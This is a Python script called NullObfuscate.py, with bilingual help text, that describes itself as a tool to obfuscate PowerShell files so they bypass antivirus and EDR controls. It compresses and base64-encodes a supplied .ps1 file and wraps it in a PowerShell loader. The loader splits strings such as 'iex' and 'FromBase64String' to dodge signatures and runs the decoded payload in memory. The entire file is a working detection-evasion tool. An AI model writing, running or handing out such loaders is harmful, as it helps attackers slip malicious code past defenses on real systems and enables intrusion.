#!/usr/bin/env python3

import argparse
import sys
import locale
import os
import zlib
import base64
import ctypes
import atexit

# ANSI Colors
FAIL = "\033[91m"
OKGREEN = "\033[92m"
ENDC = "\033[0m"
HEADER = "\033[95m"

# Function for colors in Windows
def init():
	def restore_console():
		# Restore the original console mode
		print(ENDC, end="")
		stdout = ctypes.windll.kernel32.GetStdHandle(-11)
		ctypes.windll.kernel32.SetConsoleMode(stdout, original_mode)
	
	if os.name == 'nt':
		# Get the handle of the standard output
	    stdout = ctypes.windll.kernel32.GetStdHandle(-11) # -11 representa STD_OUTPUT_HANDLE

	    # Save the original console mode
	    global original_mode
	    original_mode = ctypes.c_uint32()

	    ctypes.windll.kernel32.GetConsoleMode(stdout, ctypes.byref(original_mode))

	    # Enable special character processing
	    new_mode = original_mode.value | 0x0004
	    ctypes.windll.kernel32.SetConsoleMode(stdout, new_mode)
	    atexit.register(restore_console)

init()

# Detect the system language
lang, _ = locale.getlocale()

# Configure messages according to language
if lang.startswith("es"):  # Spanish
    description = "Ofusca archvios .ps1 para evadir controles de AV/EDR por HTTP."
    epilog = "Ejemplo: python NullObfuscate.py -f archivo.ps1 -o salida.ps1"
    help_file = "Archivo .ps1 a ofuscar"
    help_out = "Nombre del archivo de salida"
else:  # English (default)
    description = "Obfuscate .ps1 files to bypass AV/EDR controls over HTTP."
    epilog = "Example: python NullObfuscate.py -f file.ps1 -o out.ps1"
    help_file = ".ps1 file to obfuscate"
    help_out = "Output file name"

# Configure parser
parser = argparse.ArgumentParser(
    description=description,
    epilog=epilog,
    formatter_class=argparse.ArgumentDefaultsHelpFormatter
)

# Adding arguments
parser.add_argument("-f", "--file", type=str, help=help_file)
parser.add_argument("-o", "--output", type=str, default="out.ps1", help=help_out)

# Show help if there are no arguments
if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

# Parse arguments
args = parser.parse_args()

# Check if the file exists
if os.path.exists(args.file):
    try:
    	# Open the file as read
    	with open(args.file, 'r') as f:
        	strr = f.read()
        	string_val = strr.encode()
        	
        	# We compress the content
        	zlibbed_str = zlib.compress(string_val)
        	compressed_string = zlibbed_str[2:-4]

        	# Format and use base64 to use it in PowerShell
        	powershell_command = """$c ="Defla" + "teStream";$b = "Compre" + "ssion"; $a ="Strea" + "mReader"; .("i"+"ex") $(New-Object IO.$a ($(New-Object IO.$b.$c ($(New-Object IO.MemoryStream(,$([Convert]::("FromB" +"ase6" + "4String")("{}")))), [IO.Compression.CompressionMode]::("De" +"compress"))), [Text.Encoding]::ASCII)).ReadToEnd();"""
        	powershell_command = powershell_command.format(base64.b64encode(compressed_string).decode('ascii'))
        
    except Exception as err:
    	# Error messages by language
    	if lang.startswith("es"):
    		print(f"{FAIL}[!] Error: Al abrir el archivo '{args.file}': {err}")
    	else:
    		print(f"{FAIL}[!] Error: When opening the file '{args.file}': {err}")
    	sys.exit(1)

    try:
    	# We write the output to a file
    	with open(args.output, 'w') as file:
    		file.write(powershell_command)
    		if lang.startswith("es"):
    			print(f"{OKGREEN}[+] Archivo {args.file} ofuscado correctamente!")
    			print(f"{HEADER}[i] Guardado como: {args.output}")
    		else:
    			print(f"{OKGREEN}[+] File {args.file} obfuscated successfully!")
    			print(f"{HEADER}[i] Saved as: {args.output}")

    except Exception as err:
    	# More errors
    	if lang.startswith("es"):
    		print(f"{FAIL}[!] Error: Al abrir el archivo '{args.output}': {err}")
    	else:
    		print(f"{FAIL}[!] Error: When opening the file '{args.output}': {err}")

else:
	# More errors if file dont exist
	if lang.startswith("es"):
		print(f"{FAIL}[!] El archivo '{args.file}' no existe.")
	else:
		print(f"{FAIL}[!] The file '{args.file}' does not exist.")
